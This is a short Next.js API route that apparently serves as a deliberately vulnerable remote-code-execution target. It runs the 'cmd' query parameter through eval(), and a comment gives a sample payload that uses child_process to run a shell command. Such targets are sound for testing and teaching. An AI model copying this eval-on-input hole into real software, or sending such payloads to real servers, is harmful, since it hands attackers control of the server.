import type { NextApiRequest, NextApiResponse } from 'next'

// Example use:
// /api/rce?cmd=import('child_process').then((cp)=>cp.exec('touch proof'))

type Result = {
  result: string
}

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Result>
) {
  if (typeof req.query.cmd === 'string') {
    eval(req.query.cmd)
  }
  res.status(200).send({ result: 'OK' })
}
